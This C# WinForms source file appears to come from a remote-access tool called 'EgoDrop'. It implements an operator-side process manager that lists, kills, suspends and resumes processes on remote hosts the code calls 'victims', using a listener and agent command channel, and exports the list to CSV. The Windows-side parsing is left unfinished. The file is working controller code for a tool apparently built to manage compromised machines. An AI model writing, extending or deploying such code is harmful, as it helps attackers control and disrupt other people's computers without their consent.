using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Security.Policy;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EgoDrop
{
    public partial class frmProcMgr : Form
    {
        private clsAgent m_agent { get; init; }

        private List<string> m_lsLinuxColumns = new List<string>()
        {
            "PID",
            "PPID",
            "Name",
            "User",
            "CmdLine",
            "ExePath",
            "RSS(KB)",
            "VMS(KB)",
        };
        private List<string> m_lsWinColumns = new List<string>()
        {

        };

        public frmProcMgr(clsAgent agnet)
        {
            InitializeComponent();

            m_agent = agnet;
        }

        private struct stLinuxProcInfo
        {
            public bool bIsEmpty;

            public uint nPID;
            public uint nPpid;

            public string szName;
            public string szUser;
            public string szCmdLine;
            public string szExePath;

            public long rss_kb;
            public long vms_kb;

            public List<uint> vChildren;
        }

        private struct stWinProcInfo
        {
            public bool bIsEmpty;

            public string szName;
            public uint nPid;
            public string szDescription;
            public string szExecutablePath;
            public string szCaption;
            public string szCommandLine;
            public string szStatus;

            public DateTime dtCreationDate;
            public DateTime dtInstallDate;
        }

        private stLinuxProcInfo fnGetLinuxProcInfo(ListViewItem item) => item.Tag == null ? new stLinuxProcInfo() { bIsEmpty = true } : (stLinuxProcInfo)item.Tag;
        private stWinProcInfo fnGetWinProcInfo(ListViewItem item) => item.Tag == null ? new stWinProcInfo() { bIsEmpty = true } : (stWinProcInfo)item.Tag;
        private uint fnGetPid(ListViewItem item)
        {
            if (m_agent.m_bUnixlike)
            {
                var info = fnGetLinuxProcInfo(item);
                if (info.bIsEmpty)
                    return 0;

                return info.nPID;
            }
            else
            {
                var info = fnGetWinProcInfo(item);
                if (info.bIsEmpty)
                    return 0;

                return info.nPid;
            }
        }

        private List<stLinuxProcInfo> fnLinuxParser(string szInput)
        {
            var ls1 = clsEZData.fnlsB64D2Str(szInput, "|");
            var lsResult = new List<stLinuxProcInfo>();

            foreach (var ls in ls1)
            {
                var s = ls.Split(',').Select(x => clsEZData.fnB64D2Str(x)).ToList();
                var lnPid = clsEZData.fnlsB64D2Str(s.Last(), "|").Where(y => !string.IsNullOrEmpty(y)).Select(x => uint.Parse(x)).ToList();

                var info = new stLinuxProcInfo()
                {
                    nPID = uint.Parse(s[0]),
                    nPpid = uint.Parse(s[1]),
                    szName = s[2],
                    szUser = s[3],
                    szCmdLine = s[4],
                    szExePath = s[5],

                    rss_kb = uint.Parse(s[6]),
                    vms_kb = uint.Parse(s[7]),

                    vChildren = lnPid,
                };

                lsResult.Add(info);
            }

            return lsResult;
        }
        private List<stWinProcInfo> fnWinParser(string szInput)
        {
            var ls1 = clsEZData.fnlsB64D2Str(szInput);
            var lsResult = new List<stWinProcInfo>();

            foreach (var ls in ls1)
            {
                var s = ls.Split(',').ToList();
                var lnPid = clsEZData.fnlsB64D2Str(s.Last()).Select(x => uint.Parse(x)).ToList();

                var info = new stWinProcInfo()
                {

                };

                lsResult.Add(info);
            }

            return lsResult;
        }

        private void fnRecv(clsListener listener, clsVictim victim, string szSrcVictimID, List<string> lsMsg)
        {
            if (!string.Equals(szSrcVictimID, m_agent.m_szVictimID))
                return;

            Invoke(new Action(() =>
            {
                if (lsMsg[0] == "proc")
                {
                    if (lsMsg[1] == "ls")
                    {
                        if (m_agent.m_bUnixlike)
                        {
                            var ls = fnLinuxParser(lsMsg[2]);

                            foreach (var info in ls)
                            {
                                //ListView
                                ListViewItem item = new ListViewItem(info.nPID.ToString());
                                item.SubItems.Add(info.nPpid.ToString());
                                item.SubItems.Add(info.szName);
                                item.SubItems.Add(info.szUser);
                                item.SubItems.Add(info.szCmdLine);
                                item.SubItems.Add(info.szExePath);
                                item.SubItems.Add(info.rss_kb.ToString());
                                item.SubItems.Add(info.vms_kb.ToString());

                                item.Tag = info;

                                listView1.Items.Add(item);

                                //TreeView
                                TreeNode node = new TreeNode($"{info.szName}[{info.nPID}]");
                                foreach (int nPid in info.vChildren)
                                    node.Nodes.Add(new TreeNode($"{info.szName}[{nPid}]"));

                                treeView1.Nodes.Add(node);
                            }
                        }
                        else
                        {
                            var ls = fnWinParser(lsMsg[2]);

                            foreach (var info in ls)
                            {

                            }
                        }

                        toolStripStatusLabel1.Text = $"Process[{listView1.Items.Count}]";
                    }
                }
            }));
        }

        private void fnGetProcesses()
        {
            toolStripStatusLabel1.Text = "Loading...";

            listView1.Items.Clear();
            treeView1.Nodes.Clear();

            m_agent.fnSendCommand(new string[]
            {
                "proc",
                "ls",
            });
        }

        private void fnKillProcess(uint nPid)
        {
            if (nPid == 0)
                return;

            m_agent.fnSendCommand(new string[]
            {
                "proc",
                "kill",
                nPid.ToString(),
            });
        }

        private void fnStopProcess(uint nPid)
        {
            if (nPid == 0)
                return;

            m_agent.fnSendCommand(new string[]
            {
                "proc",
                "stop",
                nPid.ToString(),
            });
        }

        private void fnContiProcess(uint nPid)
        {
            if (nPid == 0)
                return;

            m_agent.fnSendCommand(new string[]
            {
                "proc",
                "cont",
                nPid.ToString(),
            });
        }

        void fnSetup()
        {
            toolStripStatusLabel1.Text = "Loading...";

            listView1.View = View.Details;
            listView1.FullRowSelect = true;
            listView1.Items.Clear();
            listView1.Columns.Clear();

            if (m_agent.m_bUnixlike)
            {
                for (int i = 0; i < m_lsLinuxColumns.Count; i++)
                {
                    listView1.Columns.Add(m_lsLinuxColumns[i]);
                    listView1.Columns[i].Width = 200;
                }
            }
            else
            {
                for (int i = 0; i < m_lsWinColumns.Count; i++)
                {
                    listView1.Columns.Add(m_lsWinColumns[i]);
                    listView1.Columns[i].Width = 200;
                }
            }

            m_agent.m_victim.m_listener.evtReceivedMessage += fnRecv;

            fnGetProcesses();
        }

        private void frmProcMgr_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void frmProcMgr_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_agent.m_victim.m_listener.evtReceivedMessage -= fnRecv;
        }

        private void frmProcMgr_KeyDown(object sender, KeyEventArgs e)
        {
            
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                uint nPid = fnGetPid(item);
                fnKillProcess(nPid);
            }
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                uint nPid = fnGetPid(item);
                fnStopProcess(nPid);
            }
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                uint nPid = fnGetPid(item);
                fnContiProcess(nPid);
            }
        }

        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            fnGetProcesses();
        }

        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            fnGetProcesses();
        }

        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = $"CSV File|*.csv";

            if (sfd.ShowDialog() == DialogResult.OK)
            {
                using (FileStream fs = File.Open(sfd.FileName, FileMode.OpenOrCreate, FileAccess.ReadWrite))
                {
                    using (StreamWriter sw = new StreamWriter(fs))
                    {
                        sw.WriteLine(string.Join(",", m_agent.m_bUnixlike ? m_lsLinuxColumns : m_lsWinColumns));

                        foreach (ListViewItem item in listView1.Items)
                        {
                            List<string> lines = item.SubItems.Cast<ListViewItem.ListViewSubItem>().Select(x => x.Text).ToList();
                            sw.WriteLine(string.Join(",", lines));
                        }
                    }
                }

                MessageBox.Show("Save file successfully: " + sfd.FileName, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
    }
}
